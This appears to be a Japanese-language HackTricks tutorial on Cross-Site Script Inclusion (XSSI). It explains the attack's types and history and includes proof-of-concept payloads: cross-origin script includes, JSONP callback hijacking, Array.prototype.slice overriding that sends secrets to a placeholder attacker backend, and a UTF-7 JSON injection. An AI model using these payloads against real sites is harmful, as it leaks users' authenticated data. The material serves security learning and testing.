# XSSI (Cross-Site Script Inclusion)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

#### この情報は[https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)から取得されました

## 基本情報

XSSIは、**リソースが`script`タグを使用して含まれる場合、SOPが適用されない**という事実を利用する脆弱性の一種を指します。なぜなら、スクリプトはクロスドメインで含まれることが可能である必要があるからです。攻撃者は、**`script`タグ**を使用して含まれたものを**すべて読む**ことができます。

これは、クッキーのようないわゆるambient-authority情報が認証に使用されるとき、動的JavaScriptやJSONPに関して特に興味深いです。異なるホストからリソースをリクエストする際に、クッキーが含まれます。

### 種類

1. 静的JavaScript（通常のXSSI）
2. 認証された場合にのみアクセス可能な静的JavaScript
3. 動的JavaScript
4. 非JavaScript

## 通常のXSSI

プライベート情報はグローバルにアクセス可能なJSファイル内に位置しており、ファイルを読んだり、キーワードを検索したり、正規表現を使用することでこれを検出できます。\
これを悪用するには、悪意のあるコンテンツ内にプライベート情報を含むスクリプトを含めるだけです：
```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
## Dynamic-JavaScript-based-XSSI と Authenticated-JavaScript-XSSI

**ユーザーがリクエストすると、機密情報がスクリプトに追加されます**。これは、クッキー**ありとなしでリクエストを送信することで簡単に発見できます**。もし**異なる情報**が取得された場合、機密情報が含まれている可能性があります。これを自動的に行うには、burp拡張機能を使用できます: [https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)。

情報がグローバル変数内にある場合は、前述のケースと同じコードを使用して悪用できます。\
機密データがJSONPレスポンス内で送信される場合、実行される関数をオーバーライドして情報を取得できます：
```markup
<script>
//The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
または、JSONPレスポンスによって実行される準備された関数を設定することもできます：
```markup
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
```markdown
グローバル名前空間内に変数が存在しない場合でも、_プロトタイプ改ざん_ を使用してこれを悪用することが時々可能です。プロトタイプ改ざんは、JavaScriptの設計を悪用します。つまり、コードを解釈する際、JavaScriptはプロトタイプチェーンをたどって呼び出されたプロパティを見つけます。以下の例は、論文 [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) から抜粋されたもので、`Array` 型の関連関数をオーバーライドし、`this` へのアクセスを通じて、非グローバル変数もまた漏洩され得ることを示しています。
```
```javascript
(function(){
var arr = ["secret1", "secret2", "secret3"];
// intents to slice out first entry
var x = arr.slice(1);
...
})();
```
元のコードでは、`Array` タイプの `slice` が興味のあるデータにアクセスします。攻撃者は、前述の節で説明されているように、`slice` をオーバーライドして秘密情報を盗むことができます。
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
セキュリティ研究者の[Sebastian Lekies](https://twitter.com/slekies)は最近、[ベクター](http://sebastian-lekies.de/leak/)のリストを更新しました。

## 非スクリプト-XSSI

竹田武志は彼の論文[Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf)で、別の種類のXSSIについて説明しています。彼は、CSVファイルを`script`タグのソースとして含めることで、変数や関数名としてデータを使用し、クロスオリジンで非スクリプトファイルをリークすることに成功しました。

最初に公開されたXSSI攻撃は2006年です。Jeremiah Grossmanのブログエントリ[Advanced Web Attack Techniques using GMail](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html)では、`Array`コンストラクタをオーバーライドすることで、Googleアカウントの完全なアドレス帳を読み取ることができるXSSIを描写しています。

2007年にJoe Walkerは[JSON is not as safe as people think it is](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)を公開しました。彼は`Array`内のJSONを盗むために同じアイデアを使用しています。

その他の関連する攻撃には、JSONフォーマットから脱出するためにJSONにUTF-7エンコードされたコンテンツを注入するものがあります。これは、[Hackvertor](https://hackvertor.co.uk/public)の著者であるGareth Heyesによって説明されており、2011年にリリースされたブログエントリ[JSON Hijacking](http://www.thespanner.co.uk/2011/05/30/json-hijacking/)で述べられています。簡単なテストでは、これはMicrosoft Internet ExplorerとEdgeではまだ可能でしたが、Mozilla FirefoxやGoogle Chromeでは不可能でした。

UTF-7でエンコードされたJSON:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```
攻撃者のページにJSONを含める
```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
